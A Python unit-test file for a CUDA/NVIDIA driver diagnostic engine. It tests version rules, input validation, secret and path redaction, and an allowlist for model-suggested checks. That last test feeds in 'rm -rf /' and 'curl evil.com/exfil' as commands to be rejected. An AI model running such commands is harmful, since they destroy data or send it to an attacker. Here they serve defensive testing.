import json
import unittest
from pathlib import Path

from stacklens_ai.engine import (
    DEFAULT_SAFE_CHECKS,
    MAJOR_FAMILY_MIN_DRIVER_BRANCH,
    SAFE_CHECKS_ALLOWLIST,
    SnapshotError,
    evaluate,
    evidence_for_model,
    validate_suggested_check,
)

FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"


def load(name):
    return json.loads((FIXTURES / name).read_text(encoding="utf-8"))


class EngineTests(unittest.TestCase):
    def test_driver_below_minimum(self):
        result = evaluate(load("driver-too-old.json"))
        self.assertEqual([f["rule_id"] for f in result], ["CUDA-DRIVER-0001"])
        self.assertEqual(result[0]["severity"], "high")
        self.assertIn("Authoritative documented CUDA 12.x minimum branch: 525", result[0]["evidence"][1])

    def test_authoritative_table_overrides_manipulated_json(self):
        """Authoritative table must NOT trust falsified or manipulated minimums inside the JSON."""
        snapshot = load("driver-too-old.json")
        # Attacker / corrupted data tries to claim minimum branch is 400 (so 470 would pass)
        snapshot["cuda"]["data"]["compatibility"][0]["documented_minimum_driver_branch"] = 400
        result = evaluate(snapshot)
        # Because authoritative table has 525 for CUDA 12, rule must still fire!
        self.assertEqual([f["rule_id"] for f in result], ["CUDA-DRIVER-0001"])
        self.assertIn("Authoritative documented CUDA 12.x minimum branch: 525", result[0]["evidence"][1])

    def test_driver_meets_minimum_produces_no_false_positive(self):
        """Driver 535 meets CUDA 12 minimum (525) -> CUDA-DRIVER-0001 must not fire."""
        snapshot = load("driver-too-old.json")
        snapshot["cuda"]["data"]["compatibility"][0]["observed_driver_branch"] = 535
        result = evaluate(snapshot)
        self.assertEqual(result, [])

    def test_unsupported_or_unknown_cuda_family_safe(self):
        """Unknown or unmapped CUDA major family must not cause crashes or false positives."""
        snapshot = load("driver-too-old.json")
        snapshot["cuda"]["data"]["compatibility"][0]["cuda_major"] = 99
        self.assertEqual(evaluate(snapshot), [])

    def test_fallback_to_toolkits_when_compatibility_probe_missing(self):
        """If compatibility probe is omitted, toolkits version triggers the check."""
        snapshot = {
            "schema_version": 1,
            "nvidia_driver": {
                "status": "collected",
                "data": {"kernel_module_version": "470.82.00", "userspace_version": "470.82.00"},
            },
            "cuda": {
                "status": "collected",
                "data": {
                    "toolkits": [{"version": {"major": 12, "minor": 2, "patch": 0}}],
                },
            },
        }
        result = evaluate(snapshot)
        self.assertEqual([f["rule_id"] for f in result], ["CUDA-DRIVER-0001"])

    def test_conflicting_selectors_are_not_proof_of_breakage(self):
        result = evaluate(load("selector-conflict.json"))
        rule_ids = {f["rule_id"] for f in result}
        self.assertIn("CUDA-PATH-0001", rule_ids)
        self.assertIn("CUDA-RUNTIME-0001", rule_ids)
        path_finding = next(f for f in result if f["rule_id"] == "CUDA-PATH-0001")
        self.assertIn("does not by itself prove a runtime failure", path_finding["interpretation"])

    def test_identical_selectors_do_not_fire_rule(self):
        snapshot = {
            "schema_version": 1,
            "cuda": {
                "status": "collected",
                "data": {
                    "selectors": {
                        "cuda_home": {"path": "/usr/local/cuda-12.2"},
                        "cuda_path": {"path": "/usr/local/cuda-12.2/"},
                    }
                },
            },
        }
        self.assertEqual(evaluate(snapshot), [])

    def test_single_runtime_candidate_does_not_fire_rule(self):
        snapshot = {
            "schema_version": 1,
            "cuda": {
                "status": "collected",
                "data": {
                    "runtime_libraries": [
                        {"path": "/usr/local/cuda-12.2/lib64/libcudart.so.12.2.140"},
                    ]
                },
            },
        }
        self.assertEqual(evaluate(snapshot), [])

    def test_driver_component_mismatch(self):
        result = evaluate(load("driver-component-mismatch.json"))
        self.assertEqual(result[0]["rule_id"], "NVIDIA-DRIVER-0001")
        self.assertEqual(result[0]["severity"], "high")

    def test_driver_versions_match_does_not_fire_mismatch(self):
        snapshot = {
            "schema_version": 1,
            "nvidia_driver": {
                "status": "collected",
                "data": {"kernel_module_version": "535.183.01", "userspace_version": "535.183.01"},
            },
        }
        self.assertEqual(evaluate(snapshot), [])

    def test_malformed_driver_versions_safe(self):
        for bad in ["not-a-version", "", None, 123, "   "]:
            with self.subTest(bad=bad):
                snapshot = {
                    "schema_version": 1,
                    "nvidia_driver": {
                        "status": "collected",
                        "data": {"kernel_module_version": bad, "userspace_version": "535.183.01"},
                    },
                }
                self.assertEqual(evaluate(snapshot), [])

    def test_no_finding_is_not_health_assessment(self):
        self.assertEqual(evaluate({"schema_version": 1}), [])

    def test_requires_schema_one(self):
        for value in (0, 2, True, "1", None, -1):
            with self.subTest(value=value):
                with self.assertRaises(SnapshotError):
                    evaluate({"schema_version": value})

    def test_requires_json_dict(self):
        for bad in ("string", [1, 2], None, 42, True):
            with self.subTest(bad=bad):
                with self.assertRaises(SnapshotError):
                    evaluate(bad)

    def test_model_evidence_excludes_raw_snapshot_paths(self):
        snapshot = load("selector-conflict.json")
        snapshot["environment"] = {
            "status": "collected",
            "data": {"variables": {"SECRET_KEY": "secret-never-send"}},
        }
        findings = evaluate(snapshot)
        outbound = json.dumps(evidence_for_model(findings))
        self.assertNotIn("secret-never-send", outbound)
        self.assertNotIn("/usr/local/", outbound)
        self.assertNotIn("/opt/a/", outbound)

    def test_evidence_sanitizes_user_paths(self):
        findings = [
            {
                "rule_id": "CUDA-PATH-0001",
                "title": "Test Path",
                "evidence": ["Error at /home/johndoe/cuda and /Users/alice/cuda"],
                "interpretation": "Interpretation",
            }
        ]
        ev = evidence_for_model(findings)
        ev_str = json.dumps(ev)
        self.assertNotIn("johndoe", ev_str)
        self.assertNotIn("alice", ev_str)
        self.assertIn("/<user>/cuda", ev_str)

    def test_missing_probe_not_mistaken_for_observation(self):
        snapshot = load("driver-too-old.json")
        snapshot["cuda"] = {"status": "not_implemented"}
        self.assertEqual(evaluate(snapshot), [])

    def test_allowlist_command_validation(self):
        # Valid allowlisted command must pass through
        self.assertEqual(
            validate_suggested_check("CUDA-DRIVER-0001", "nvidia-smi"),
            "nvidia-smi",
        )
        self.assertEqual(
            validate_suggested_check("CUDA-DRIVER-0001", "cat /proc/driver/nvidia/version"),
            "cat /proc/driver/nvidia/version",
        )
        # Arbitrary or dangerous command must be rejected and substituted with safe default
        self.assertEqual(
            validate_suggested_check("CUDA-DRIVER-0001", "rm -rf /"),
            DEFAULT_SAFE_CHECKS["CUDA-DRIVER-0001"],
        )
        self.assertEqual(
            validate_suggested_check("CUDA-DRIVER-0001", "curl evil.com/exfil"),
            DEFAULT_SAFE_CHECKS["CUDA-DRIVER-0001"],
        )
        self.assertEqual(
            validate_suggested_check("CUDA-DRIVER-0001", None),
            DEFAULT_SAFE_CHECKS["CUDA-DRIVER-0001"],
        )


if __name__ == "__main__":
    unittest.main()
